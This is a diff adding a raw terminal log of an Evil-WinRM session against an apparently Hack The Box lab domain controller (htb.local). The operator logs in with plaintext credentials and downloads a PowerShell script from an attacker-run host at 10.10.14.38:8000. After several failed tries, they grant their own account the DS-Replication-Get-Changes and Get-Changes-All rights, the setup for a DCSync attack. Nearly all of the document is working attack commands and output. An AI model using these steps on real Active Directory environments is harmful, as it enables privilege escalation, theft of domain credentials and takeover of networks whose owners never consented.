@@ -1,0 +1,145 @@
+root@root:~/Downloads/tools/windows/evil-winrm# ./evil-winrm.rb -u rootsid -p rootsidtest -i 10.10.10.161
+
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\rootsid\Documents> ls
+*Evil-WinRM* PS C:\Users\rootsid\Documents> Invoke-WebRequest -Uri "10.10.14.38:8000/Exchange.ps1" -OutFile 
+^C
+
+Warning: Press "y" to exit, press any other key to continue
+
+*Evil-WinRM* PS C:\Users\rootsid\Documents> Invoke-WebRequest -Uri "10.10.14.38:8000/Exchange.ps1" -OutFile Exchange.ps1
+The remote server returned an error: (404) Not Found.
+At line:1 char:1
++ Invoke-WebRequest -Uri "10.10.14.38:8000/Exchange.ps1" -OutFile Excha ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (System.Net.HttpWebRequest:HttpWebRequest) [Invoke-WebRequest], WebException
+    + FullyQualifiedErrorId : WebCmdletWebResponseException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand
+*Evil-WinRM* PS C:\Users\rootsid\Documents> dir
+*Evil-WinRM* PS C:\Users\rootsid\Documents> ls
+*Evil-WinRM* PS C:\Users\rootsid\Documents> Invoke-WebRequest -Uri "10.10.14.38:8000/Exchange.ps1" -OutFile Exchange.ps1
+The remote server returned an error: (404) Not Found.
+At line:1 char:1
++ Invoke-WebRequest -Uri "10.10.14.38:8000/Exchange.ps1" -OutFile Excha ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (System.Net.HttpWebRequest:HttpWebRequest) [Invoke-WebRequest], WebException
+    + FullyQualifiedErrorId : WebCmdletWebResponseException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand
+*Evil-WinRM* PS C:\Users\rootsid\Documents> Invoke-WebRequest -Uri "10.10.14.38:8000/exchange.ps1" -OutFile Exchange.ps1
+*Evil-WinRM* PS C:\Users\rootsid\Documents> ./Exchange.ps1
+Cannot find drive. A drive with the name 'ad' does not exist.
+At C:\Users\rootsid\Documents\Exchange.ps1:1 char:8
++ $acl = get-acl "ad:DC=htb,DC=local"
++        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (ad:String) [Get-Acl], DriveNotFoundException
+    + FullyQualifiedErrorId : DriveNotFound,Microsoft.PowerShell.Commands.GetAclCommand
+You cannot call a method on a null-valued expression.
+At C:\Users\rootsid\Documents\Exchange.ps1:12 char:1
++ $acl.AddAccessRule($ace)
++ ~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException
+    + FullyQualifiedErrorId : InvokeMethodOnNull
+You cannot call a method on a null-valued expression.
+At C:\Users\rootsid\Documents\Exchange.ps1:16 char:1
++ $acl.AddAccessRule($ace)
++ ~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException
+    + FullyQualifiedErrorId : InvokeMethodOnNull
+Cannot bind argument to parameter 'AclObject' because it is null.
+At C:\Users\rootsid\Documents\Exchange.ps1:17 char:20
++ Set-acl -aclobject $acl "ad:DC=htb,DC=local"
++                    ~~~~
+    + CategoryInfo          : InvalidData: (:) [Set-Acl], ParameterBindingValidationException
+    + FullyQualifiedErrorId : ParameterArgumentValidationErrorNullNotAllowed,Microsoft.PowerShell.Commands.SetAclCommand
+*Evil-WinRM* PS C:\Users\rootsid\Documents> $acl = get-acl "ad:DC=htb,DC=local"
+*Evil-WinRM* PS C:\Users\rootsid\Documents> $id = [Security.Principal.WindowsIdentity]::GetCurrent()
+*Evil-WinRM* PS C:\Users\rootsid\Documents> $user = Get-ADUser -Identity $id.User
+*Evil-WinRM* PS C:\Users\rootsid\Documents> $sid = new-object System.Security.Principal.SecurityIdentifier $user.SID
+*Evil-WinRM* PS C:\Users\rootsid\Documents> # rightsGuid for the extended right Ds-Replication-Get-Changes-All
+*Evil-WinRM* PS C:\Users\rootsid\Documents> $objectguid = new-object Guid  1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
+*Evil-WinRM* PS C:\Users\rootsid\Documents> $identity = [System.Security.Principal.IdentityReference] $sid
+*Evil-WinRM* PS C:\Users\rootsid\Documents> $adRights = [System.DirectoryServices.ActiveDirectoryRights] "ExtendedRi>
+At line:1 char:62
++ ... ights = [System.DirectoryServices.ActiveDirectoryRights] "ExtendedRi>
++                                                              ~~~~~~~~~~~~
+The string is missing the terminator: ".
+    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
+    + FullyQualifiedErrorId : TerminatorExpectedAtEndOfString,Microsoft.PowerShell.Commands.InvokeExpressionCommand
+*Evil-WinRM* PS C:\Users\rootsid\Documents> $type = [System.Security.AccessControl.AccessControlType] "Allow"
+*Evil-WinRM* PS C:\Users\rootsid\Documents> $inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInhe>
+At line:1 char:72
++ ... eritanceType = [System.DirectoryServices.ActiveDirectorySecurityInhe>
++                                                                        ~
+Missing ] at end of attribute or type literal.
+
+At line:1 char:74
++ ... eritanceType = [System.DirectoryServices.ActiveDirectorySecurityInhe>
++                                                                          ~
+Missing file specification after redirection operator.
+    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
+    + FullyQualifiedErrorId : EndSquareBracketExpectedAtEndOfAttribute,Microsoft.PowerShell.Commands.InvokeExpressionCommand
+*Evil-WinRM* PS C:\Users\rootsid\Documents> $ace = new-object System.DirectoryServices.ActiveDirectoryAccessRule $id>
+Cannot find an overload for "ActiveDirectoryAccessRule" and the argument count: "1".
+At line:1 char:8
++ $ace = new-object System.DirectoryServices.ActiveDirectoryAccessRule  ...
++        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (:) [New-Object], MethodException
+    + FullyQualifiedErrorId : ConstructorInvokedThrowException,Microsoft.PowerShell.Commands.NewObjectCommand
+*Evil-WinRM* PS C:\Users\rootsid\Documents> $acl.AddAccessRule($ace)
+Exception calling "AddAccessRule" with "1" argument(s): "Value cannot be null.
+Parameter name: rule"
+At line:1 char:1
++ $acl.AddAccessRule($ace)
++ ~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : ArgumentNullException
+*Evil-WinRM* PS C:\Users\rootsid\Documents> # rightsGuid for the extended right Ds-Replication-Get-Changes
+*Evil-WinRM* PS C:\Users\rootsid\Documents> $objectguid = new-object Guid 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
+*Evil-WinRM* PS C:\Users\rootsid\Documents> $ace = new-object System.DirectoryServices.ActiveDirectoryAccessRule $id>
+Cannot find an overload for "ActiveDirectoryAccessRule" and the argument count: "1".
+At line:1 char:8
++ $ace = new-object System.DirectoryServices.ActiveDirectoryAccessRule  ...
++        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (:) [New-Object], MethodException
+    + FullyQualifiedErrorId : ConstructorInvokedThrowException,Microsoft.PowerShell.Commands.NewObjectCommand
+*Evil-WinRM* PS C:\Users\rootsid\Documents> $acl.AddAccessRule($ace)
+Exception calling "AddAccessRule" with "1" argument(s): "Value cannot be null.
+Parameter name: rule"
+At line:1 char:1
++ $acl.AddAccessRule($ace)
++ ~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : ArgumentNullException
+*Evil-WinRM* PS C:\Users\rootsid\Documents> Set-acl -aclobject $acl "ad:DC=htb,DC=local"
+This security ID may not be assigned as the owner of this object
+At line:1 char:1
++ Set-acl -aclobject $acl "ad:DC=htb,DC=local"
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (DC=htb,DC=local:String) [Set-Acl], ADException
+    + FullyQualifiedErrorId : ADProvider:SetSecurityDescriptor:ADError,Microsoft.PowerShell.Commands.SetAclCommand
+*Evil-WinRM* PS C:\Users\rootsid\Documents> clear
+*Evil-WinRM* PS C:\Users\rootsid\Documents> cls
+*Evil-WinRM* PS C:\Users\rootsid\Documents> $acl = get-acl "ad:DC=htb,DC=local"
+*Evil-WinRM* PS C:\Users\rootsid\Documents> $id = [Security.Principal.WindowsIdentity]::GetCurrent()
+*Evil-WinRM* PS C:\Users\rootsid\Documents> $user = Get-ADUser -Identity $id.User
+*Evil-WinRM* PS C:\Users\rootsid\Documents> $sid = new-object System.Security.Principal.SecurityIdentifier $user.SID
+*Evil-WinRM* PS C:\Users\rootsid\Documents> # rightsGuid for the extended right Ds-Replication-Get-Changes-All
+*Evil-WinRM* PS C:\Users\rootsid\Documents> $objectguid = new-object Guid  1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
+*Evil-WinRM* PS C:\Users\rootsid\Documents> $identity = [System.Security.Principal.IdentityReference] $sid
+*Evil-WinRM* PS C:\Users\rootsid\Documents> $adRights = [System.DirectoryServices.ActiveDirectoryRights] "ExtendedRight"
+*Evil-WinRM* PS C:\Users\rootsid\Documents> $type = [System.Security.AccessControl.AccessControlType] "Allow"
+*Evil-WinRM* PS C:\Users\rootsid\Documents> $inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] "None"
+*Evil-WinRM* PS C:\Users\rootsid\Documents> $ace = new-object System.DirectoryServices.ActiveDirectoryAccessRule $identity,$adRights,$type,$objectGuid,$inheritanceType
+*Evil-WinRM* PS C:\Users\rootsid\Documents> $acl.AddAccessRule($ace)
+*Evil-WinRM* PS C:\Users\rootsid\Documents> # rightsGuid for the extended right Ds-Replication-Get-Changes
+*Evil-WinRM* PS C:\Users\rootsid\Documents> $objectguid = new-object Guid 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
+*Evil-WinRM* PS C:\Users\rootsid\Documents> $ace = new-object System.DirectoryServices.ActiveDirectoryAccessRule $identity,$adRights,$type,$objectGuid,$inheritanceType
+*Evil-WinRM* PS C:\Users\rootsid\Documents> $acl.AddAccessRule($ace)
+*Evil-WinRM* PS C:\Users\rootsid\Documents> Set-acl -aclobject $acl "ad:DC=htb,DC=local"
+*Evil-WinRM* PS C:\Users\rootsid\Documents> 
+
+Warning: Press "y" to exit, press any other key to continue
+
+
+Info: Exiting...
